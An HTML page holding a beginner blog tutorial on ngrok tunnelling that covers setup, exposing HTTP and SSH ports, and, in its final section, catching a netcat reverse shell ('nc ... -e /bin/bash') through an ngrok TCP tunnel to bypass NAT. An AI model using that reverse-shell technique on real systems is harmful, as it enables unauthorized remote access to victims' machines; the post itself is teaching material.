<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Blog</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel="stylesheet" href="./blog_style.css">
<style>
       * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
     
</style>

</head>
<body>
<!-- partial:index.partial.html -->
<div class="top">
  <div class="header">
    <h1><span>Learning Ngrok </span></h1>
    <h2 class="author"><a href="#">By Romiyo <em></em> Karki</a></h2>
 
</div>
</div>
<div class="content">

<!-- Content-->
<div class="begin">
  <div class="date">
    <span>April</span>
    <span class="day">6</span></br>
  </div>
</br>
</br>



  
<header>
<h1 class="p-name">Fun with Ngrok !</h1>
</header>
<section data-field="subtitle" class="p-summary">
Getting Reverse shell across internet .
</section>
<section data-field="body" class="e-content">
<section name="2207" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="bd1d" id="bd1d" class="graf graf--h3 graf--leading graf--title">Fun with Ngrok !</h3><p name="224c" id="224c" class="graf graf--p graf-after--h3">Getting Reverse shell across internet .</p><p name="0ebf" id="0ebf" class="graf graf--p graf--hasDropCapModel graf--hasDropCap graf-after--p"><span class="graf-dropCap">D</span><em class="markup--em markup--p-em">isclaimer</em>: I am not responsible for your activities .</p><p name="a532" id="a532" class="graf graf--p graf-after--p">Before explaining what is ngrok , Lets first learn about port forwarding and when we will need it . Then we will move into what Ngrok is in deep .</p><h3 name="0687" id="0687" class="graf graf--h3 graf-after--p"><strong class="markup--strong markup--h3-strong">What is Port forwarding ?</strong></h3><p name="4db1" id="4db1" class="graf graf--p graf-after--h3">Our devices can’t listen the connection or request from the internet thanks to NAT (Network Address Translation) and firewalls . That’s why when you just listen on port on your machine only machines on same network can connect to the opened port .</p><p name="fab8" id="fab8" class="graf graf--p graf-after--p">But wait , What if I need to forward the the Port across the internet ? If i want to forward the Port 80 so my client can see my project ?</p><p name="f898" id="f898" class="graf graf--p graf-after--p">Wonder how hackers gain the tcp reverse shell across globe ?</p><blockquote name="f5b7" id="f5b7" class="graf graf--blockquote graf-after--p">Your answer is “forwarding port” .</blockquote><p name="55e6" id="55e6" class="graf graf--p graf-after--blockquote">You can forward the port via different methods either configuring your Home router but some ISP doesn&#39;t allows it and you have to even deal with annoying firewall.</p><p name="ed0d" id="ed0d" class="graf graf--p graf-after--p">Another method is using the third party Application like ngrok ,expose .</p><figure name="d367" id="d367" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*AkHNrohSLkizXdOMJPN_pw.png" data-width="1050" data-height="495" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*AkHNrohSLkizXdOMJPN_pw.png"></figure><h3 name="100a" id="100a" class="graf graf--h3 graf-after--figure">How does Ngrok works ?</h3><p name="f12a" id="f12a" class="graf graf--p graf-after--h3">Ngrok just works like an proxy , It continuously takes the input (Our files status ) then it continuously upload that file into its Server if changed and it hosts our file and provide us the hosted URL path . (That why you always get ngrok subdomain urls) . It also listens the request of the client and forwards the request to us (localhost) that&#39;s why we are able to get request .</p><p name="a764" id="a764" class="graf graf--p graf-after--p">Because the request is being proxied though an server across the globe its slow sometimes especially in tcp connection .</p><p name="7497" id="7497" class="graf graf--p graf-after--p">Here are some contents if you want to deep deeper:</p><p name="55e9" id="55e9" class="graf graf--p graf-after--p"><a href="https://www.youtube.com/watch?v=pR2qNnVIuKE&amp;ab_channel=HusseinNasser" data-href="https://www.youtube.com/watch?v=pR2qNnVIuKE&amp;ab_channel=HusseinNasser" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Expose Local WebSocket, HTTP and HTTPS WebServers to the Public Internet with Ngrok — YouTube</a></p><p name="abc6" id="abc6" class="graf graf--p graf-after--p"><a href="https://stackoverflow.com/questions/23395129/how-does-ngrok-work-behind-a-firewall" data-href="https://stackoverflow.com/questions/23395129/how-does-ngrok-work-behind-a-firewall" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">linux — How does ngrok work behind a firewall? — Stack Overflow</a></p><figure name="4a2c" id="4a2c" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*tWWP_pXUMISmkHMbePjJLg.png" data-width="1013" data-height="627" src="https://cdn-images-1.medium.com/max/800/1*tWWP_pXUMISmkHMbePjJLg.png"><figcaption class="imageCaption"><a href="https://panbo.com/geek-alert-ngrok-remote-tunnels-make-connecting-to-devices-on-the-boat-easy/" data-href="https://panbo.com/geek-alert-ngrok-remote-tunnels-make-connecting-to-devices-on-the-boat-easy/" class="markup--anchor markup--figure-anchor" rel="noopener" target="_blank">Geek Alert: ngrok remote tunnels make connecting to devices on the boat easy — Panbo</a></figcaption></figure><h3 name="27e6" id="27e6" class="graf graf--h3 graf-after--figure">Why ngrok ?</h3><blockquote name="93e4" id="93e4" class="graf graf--blockquote graf-after--h3">Imagine forwarding any port on your local host by one click which support variety of platform AND is free .</blockquote><h3 name="133c" id="133c" class="graf graf--h3 graf-after--blockquote">Initial Setup :</h3><p name="6c69" id="6c69" class="graf graf--p graf-after--h3">It’s super easy to setup the ngrok .</p><p name="3135" id="3135" class="graf graf--p graf-after--p">a. First download the ngrok from it’s offical website</p><div name="4862" id="4862" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://ngrok.com" data-href="https://ngrok.com" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://ngrok.com"><strong class="markup--strong markup--mixtapeEmbed-strong">ngrok - Online in One Line</strong><br><em class="markup--em markup--mixtapeEmbed-em">ngrok&#39;s edge is your competitive edge. Scale your services with global network acceleration and k8s-style load…</em>ngrok.com</a><a href="https://ngrok.com" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="a3355b7f5ad5ca53bf67489101625233" data-thumbnail-img-id="0*iQ7-g8guwNNLLL-n" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*iQ7-g8guwNNLLL-n);"></a></div><figure name="1b19" id="1b19" class="graf graf--figure graf-after--mixtapeEmbed"><img class="graf-image" data-image-id="1*vaet6XN08n5kxvpM-xN-PQ.png" data-width="998" data-height="588" src="https://cdn-images-1.medium.com/max/800/1*vaet6XN08n5kxvpM-xN-PQ.png"></figure><p name="907f" id="907f" class="graf graf--p graf-after--figure">i. Download the file</p><p name="97ec" id="97ec" class="graf graf--p graf-after--p">ii. Run the tar command given in the website.</p><p name="d56e" id="d56e" class="graf graf--p graf-after--p">b. Sign up &amp; Login into the Ngrok website.</p><blockquote name="b1b1" id="b1b1" class="graf graf--blockquote graf-after--p">Signing up is super easy .You can use your Gmail account to login .</blockquote><figure name="e854" id="e854" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*91hnHrpqpgrXB9ni0xbh7Q.png" data-width="432" data-height="797" src="https://cdn-images-1.medium.com/max/800/1*91hnHrpqpgrXB9ni0xbh7Q.png"></figure><p name="75c5" id="75c5" class="graf graf--p graf-after--figure">c. Select “Your Authtoken” option .</p><figure name="ac30" id="ac30" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*RBt42Bb-hpjc-gB729UFtw.png" data-width="332" data-height="249" src="https://cdn-images-1.medium.com/max/800/1*RBt42Bb-hpjc-gB729UFtw.png"></figure><p name="077f" id="077f" class="graf graf--p graf-after--figure">d. There you can see your auth token . And now paste the command in your terminal and you are good to go .</p><figure name="bfa1" id="bfa1" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*0HPbb8rtb37gFeKjSCItSA.png" data-width="1046" data-height="216" src="https://cdn-images-1.medium.com/max/800/1*0HPbb8rtb37gFeKjSCItSA.png"></figure><h3 name="5f4e" id="5f4e" class="graf graf--h3 graf-after--figure">LETS HACK !</h3><p name="6785" id="6785" class="graf graf--p graf-after--h3">a. Forwarding HTTP</p><p name="c152" id="c152" class="graf graf--p graf-after--p">You guys can forward HTTP port or any port with HTTP service running .</p><figure name="7b2e" id="7b2e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*JbHM7-21tPTX3BCHo2NiIA.png" data-width="614" data-height="181" src="https://cdn-images-1.medium.com/max/800/1*JbHM7-21tPTX3BCHo2NiIA.png"></figure><blockquote name="1b58" id="1b58" class="graf graf--blockquote graf-after--figure">Start apache2 service .</blockquote><pre name="7719" id="7719" class="graf graf--pre graf-after--blockquote">sudo service apache2 start </pre><figure name="c735" id="c735" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*0OaDXaxnim2t0djI9pBtSg.png" data-width="803" data-height="280" src="https://cdn-images-1.medium.com/max/800/1*0OaDXaxnim2t0djI9pBtSg.png"></figure><blockquote name="15e7" id="15e7" class="graf graf--blockquote graf-after--figure">We can see the url which can be globally access from anywhere on internet.</blockquote><figure name="4da3" id="4da3" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*Sj4BXQ7x0fuGhVWxWCWinw.png" data-width="604" data-height="222" src="https://cdn-images-1.medium.com/max/800/1*Sj4BXQ7x0fuGhVWxWCWinw.png"></figure><blockquote name="9758" id="9758" class="graf graf--blockquote graf-after--figure">If we visit that url we can see our locally hosted website via apache2 .</blockquote><h3 name="6240" id="6240" class="graf graf--h3 graf-after--blockquote">Forwarding SSH</h3><p name="0314" id="0314" class="graf graf--p graf-after--h3">We can forward any tcp port with ngrok . Let’s try with ssh service .</p><blockquote name="a85e" id="a85e" class="graf graf--blockquote graf-after--p">We need to first start the ssh service on our host machine .</blockquote><pre name="c861" id="c861" class="graf graf--pre graf-after--blockquote">sudo service ssh start </pre><figure name="09bb" id="09bb" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*QK-kuw4erwaLIBp--nMpNA.png" data-width="614" data-height="111" src="https://cdn-images-1.medium.com/max/800/1*QK-kuw4erwaLIBp--nMpNA.png"></figure><blockquote name="f58f" id="f58f" class="graf graf--blockquote graf-after--figure">Forward the port 22 .</blockquote><pre name="1f61" id="1f61" class="graf graf--pre graf-after--blockquote">ngrok tcp 22 </pre><figure name="f7d5" id="f7d5" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*2-nV9SQkMfaMh1ZGQhl1WQ.png" data-width="804" data-height="294" src="https://cdn-images-1.medium.com/max/800/1*2-nV9SQkMfaMh1ZGQhl1WQ.png"></figure><blockquote name="0388" id="0388" class="graf graf--blockquote graf-after--figure">We can now ssh into forward machine .</blockquote><figure name="a160" id="a160" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*AZH508nzytrshDx-xxGjaA.png" data-width="1027" data-height="225" src="https://cdn-images-1.medium.com/max/800/1*AZH508nzytrshDx-xxGjaA.png"></figure><blockquote name="b02c" id="b02c" class="graf graf--blockquote graf-after--figure">Yah Got SSH into our host machine</blockquote><figure name="1696" id="1696" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*KaOrUl0N13yL3Hk74aqtog.png" data-width="641" data-height="231" src="https://cdn-images-1.medium.com/max/800/1*KaOrUl0N13yL3Hk74aqtog.png"></figure><h3 name="c1af" id="c1af" class="graf graf--h3 graf-after--figure">Getting tcp shell across Global</h3><blockquote name="714c" id="714c" class="graf graf--blockquote graf-after--h3">First Listen on any tcp port</blockquote><pre name="23a1" id="23a1" class="graf graf--pre graf-after--blockquote">nc -lvnp &lt;port&gt; </pre><figure name="d1a4" id="d1a4" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*ryVz1-GE6E_KYzlaQ7d_uA.png" data-width="586" data-height="135" src="https://cdn-images-1.medium.com/max/800/1*ryVz1-GE6E_KYzlaQ7d_uA.png"></figure><blockquote name="0866" id="0866" class="graf graf--blockquote graf-after--figure">Now , Forward the port via ngrok</blockquote><pre name="7e2a" id="7e2a" class="graf graf--pre graf-after--blockquote">ngrok tcp &lt;port&gt;</pre><figure name="cdbf" id="cdbf" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*GorJ-bUB7AfQymb2jCmjnQ.png" data-width="807" data-height="286" src="https://cdn-images-1.medium.com/max/800/1*GorJ-bUB7AfQymb2jCmjnQ.png"></figure><p name="5405" id="5405" class="graf graf--p graf-after--figure">We get the link with tcp:/// schema and port to connect</p><blockquote name="d105" id="d105" class="graf graf--blockquote graf-after--p">On user1 : connect to the port given by ngrok and forward /bin/bash</blockquote><pre name="b198" id="b198" class="graf graf--pre graf-after--blockquote">nc &lt;dns.url&gt;&lt;port&gt; -e /bin/bash</pre><figure name="c91f" id="c91f" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*z5GVi_k41A1cDY70Uulalw.png" data-width="804" data-height="169" src="https://cdn-images-1.medium.com/max/800/1*z5GVi_k41A1cDY70Uulalw.png"></figure><blockquote name="7bfc" id="7bfc" class="graf graf--blockquote graf-after--figure">We can see on the User2 terminal we got the /bin/bash of the User1.</blockquote><figure name="de81" id="de81" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*jP2qGo77WVnWI_HMzcFztQ.png" data-width="564" data-height="137" src="https://cdn-images-1.medium.com/max/800/1*jP2qGo77WVnWI_HMzcFztQ.png"></figure><blockquote name="fa04" id="fa04" class="graf graf--blockquote graf-after--figure">We got the shell of the user 2 without physically forwarding any port on our router .</blockquote><figure name="494d" id="494d" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*U9bs76iAKZAXZ4H2kFmqqw.png" data-width="812" data-height="270" src="https://cdn-images-1.medium.com/max/800/1*U9bs76iAKZAXZ4H2kFmqqw.png"></figure><h3 name="414f" id="414f" class="graf graf--h3 graf-after--figure">Conclusion</h3><p name="1044" id="1044" class="graf graf--p graf-after--h3">Thats much for today . Ngrok is very powerful tool and</p><p name="54ef" id="54ef" class="graf graf--p graf-after--p">If you guys like content related to cyber security &amp; CTF then you guys can watch me on Youtube (<a href="https://www.youtube.com/channel/UCObYFLII6Oh4stffF8deFwg/featured" data-href="https://www.youtube.com/channel/UCObYFLII6Oh4stffF8deFwg/featured" class="markup--anchor markup--p-anchor" rel="noopener ugc nofollow noopener" target="_blank">Dr_Tomato — YouTube</a>)</p><p name="2b4c" id="2b4c" class="graf graf--p graf-after--p">Follow me on Twitter. (<a href="https://twitter.com/Dr_Tomato1337" data-href="https://twitter.com/Dr_Tomato1337" class="markup--anchor markup--p-anchor" rel="noopener ugc nofollow noopener" target="_blank">Dr_Tomato (@Dr_Tomato1337) / Twitter</a>)</p><p name="2ce3" id="2ce3" class="graf graf--p graf-after--p graf--trailing">See you guys on another blog , Till now Signing Out , Dr_Tomato.</p></div></div></section>
</section>
<div class="prev"><a href="/romiyokarki">Prev</a></div>
<div class="next"><a href="/romiyokarki">Next</a></div>

<div class="footer">
  <span class="copy">&copy; Romiyo karki</span>
  </div>
<!-- partial -->
  
</body>
</html>
